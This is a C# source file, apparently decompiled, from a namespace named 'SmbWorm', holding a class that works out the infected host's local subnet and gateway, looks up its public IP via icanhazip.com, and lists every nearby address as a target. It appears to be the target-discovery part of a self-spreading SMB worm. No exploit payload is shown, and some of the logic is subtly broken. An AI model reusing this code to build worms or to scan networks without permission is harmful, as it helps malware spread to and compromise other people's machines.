using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;

namespace SmbWorm.Smb;

internal class IpLocalHost
{
	private IPAddress getwayAddres;

	private IPAddress SubNet;

	public IPAddress MyIp;

	public IPAddress startIP;

	public IPAddress endIP;

	public IpLocalHost()
	{
		foreach (IPAddress ip2 in from ha in Dns.GetHostAddresses(Dns.GetHostName())
			where ha.AddressFamily == AddressFamily.InterNetwork
			select ha)
		{
			SubNet = GetSubnetMask(ip2);
			MyIp = ip2;
			NetworkInterface networkInterface = NetworkInterface.GetAllNetworkInterfaces().SingleOrDefault((NetworkInterface ni) => ni.GetIPProperties().UnicastAddresses.OfType<UnicastIPAddressInformation>().Any((UnicastIPAddressInformation x) => x.Address.Equals(ip2)));
			if (networkInterface == null)
			{
				continue;
			}
			GatewayIPAddressInformationCollection gatewayAddresses = networkInterface.GetIPProperties().GatewayAddresses;
			if (gatewayAddresses.Count == 0)
			{
				continue;
			}
			foreach (GatewayIPAddressInformation item in gatewayAddresses)
			{
				if (!item.Address.IsIPv6SiteLocal)
				{
					getwayAddres = item.Address;
				}
			}
		}
		IPAddress iPAddress = getwayAddres;
		int num = 24;
		switch (SubNet.ToString().Split(new char[1] { '.' })[3])
		{
		case "0":
			num = 24;
			break;
		case "128":
			num = 25;
			break;
		case "192":
			num = 26;
			break;
		case "224":
			num = 27;
			break;
		case "240":
			num = 28;
			break;
		case "248":
			num = 29;
			break;
		case "252":
			num = 30;
			break;
		case "254":
			num = 31;
			break;
		case "255":
			num = 32;
			break;
		}
		int value = ~(-1 >>> num);
		byte[] addressBytes = iPAddress.GetAddressBytes();
		byte[] array = BitConverter.GetBytes((uint)value).Reverse().ToArray();
		byte[] array2 = new byte[addressBytes.Length];
		byte[] array3 = new byte[addressBytes.Length];
		for (int i = 0; i < addressBytes.Length; i++)
		{
			array2[i] = (byte)(addressBytes[i] & array[i]);
			array3[i] = (byte)(addressBytes[i] | ~array[i]);
		}
		startIP = new IPAddress(array2);
		endIP = new IPAddress(array3);
	}

	private IPAddress GetSubnetMask(IPAddress address)
	{
		NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
		for (int i = 0; i < allNetworkInterfaces.Length; i++)
		{
			foreach (UnicastIPAddressInformation unicastAddress in allNetworkInterfaces[i].GetIPProperties().UnicastAddresses)
			{
				if (unicastAddress.Address.AddressFamily == AddressFamily.InterNetwork && address.Equals(unicastAddress.Address))
				{
					return unicastAddress.IPv4Mask;
				}
			}
		}
		throw new ArgumentException($"Can't find subnetmask for IP address '{address}'");
	}

	public string GetPublicIpAsync()
	{
		try
		{
			using WebClient webClient = new WebClient();
			return webClient.DownloadString("http://icanhazip.com").Replace("\n", "");
		}
		catch
		{
		}
		return "Request failed";
	}

	public string[] IPAddressesRange(IPAddress start, IPAddress endIp)
	{
		byte[] addressBytes = start.GetAddressBytes();
		byte[] addressBytes2 = endIp.GetAddressBytes();
		Array.Reverse((Array)addressBytes);
		Array.Reverse((Array)addressBytes2);
		int num = BitConverter.ToInt32(addressBytes, 0);
		int num2 = BitConverter.ToInt32(addressBytes2, 0);
		List<string> list = new List<string>();
		string text = MyIp.ToString();
		for (int i = num; i <= num2; i++)
		{
			byte[] bytes = BitConverter.GetBytes(i);
			string text2 = new IPAddress(new byte[4]
			{
				bytes[3],
				bytes[2],
				bytes[1],
				bytes[0]
			}).ToString();
			if (text2 != text)
			{
				list.Add(text2);
			}
		}
		try
		{
			text = GetPublicIpAsync();
			string[] array = text.Split(new char[1] { '.' });
			for (byte b = 0; b < byte.MaxValue; b++)
			{
				string text3 = array[0] + array[1] + array[2] + b;
				if (text3 != text)
				{
					list.Add(text3);
				}
			}
		}
		catch
		{
		}
		return list.ToArray();
	}

	public string[] IPAddressesRange()
	{
		return IPAddressesRange(startIP, endIP);
	}
}
